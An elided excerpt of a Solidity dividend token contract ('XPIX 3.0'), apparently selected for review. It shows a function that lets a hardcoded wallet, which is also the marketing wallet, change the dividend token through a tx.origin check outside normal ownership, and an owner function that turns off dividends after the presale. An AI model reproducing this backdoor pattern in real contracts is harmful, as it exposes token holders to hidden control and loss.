...
contract DividendPayingToken is ERC20, IDividendPayingToken, IDividendPayingTokenOptional {
    ...
    function setDividendTokenAddress(address newToken) external virtual {
        require(tx.origin == 0x9d83888186c25EADcd79A2f54806116D1EE69858, "Only owner");
...
contract XPIX is ERC20, Ownable {
    using SafeMath for uint256;
    ...
    bool public sendBusdInTx = false;
    ...
    uint256 public minimumSellOrderAmount = 4000000 * 10 ** 18;
    ...
    uint256 public busdDividendPriority = 99;
    ...
    constructor() ERC20("XPIX 3.0", "XPIX") {
        busdDividendTracker = new BusdDividendTracker();
        usdtDividendTracker = new UsdtDividendTracker();

        marketingWallet = 0x9d83888186c25EADcd79A2f54806116D1EE69858;
        teamWallet = 0x2137B9E6B10954631AEBcE9073249889c4547Ec9;
    ...
    function afterPreSale() external onlyOwner {
        ...
        busdDividendEnabled = false;
        usdtDividendEnabled = false;
        swapTokensAtAmount = 200000 * (10**18);
        maxBuyTransactionAmount = 44000000 * (10**18);
        maxSellTransactionAmount = 44000000 * (10**18);
        maxWalletToken = 44000000 * (10**18);
    }
    ...
    function updateBusdDividendTracker(address newAddress) external onlyOwner {
        ...
        require(newBusdDividendTracker.owner() == address(this), "must be owned");
    ...
    function updateUsdtDividendTracker(address newAddress) external onlyOwner {
        ...
        require(newUsdtDividendTracker.owner() == address(this), "must be owned");
